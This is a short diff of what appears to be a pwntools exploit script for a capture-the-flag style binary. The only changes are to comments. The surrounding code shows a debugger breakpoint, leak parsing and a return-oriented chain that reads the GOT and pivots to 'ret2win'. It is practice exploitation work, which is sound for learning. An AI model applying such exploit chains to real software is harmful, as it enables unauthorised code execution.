@@ -5,6 +5,7 @@ import time
 import sys
 
 # Version with call rax 
+# Probabelly attended version
 
 gs='''
 b *pwnme+180
@@ -52,7 +53,7 @@ leak = int(leak,16)
 log.info(f"{leak=:x}")
 
 # Message 1
-# Version lecture de la GOT puis call vers ret2win
+# Version : read the GOT then jump ret2win
 PL=p64(plt_foothold)
 PL+=p64(g_poprax)
 PL+=p64(got_foothold)
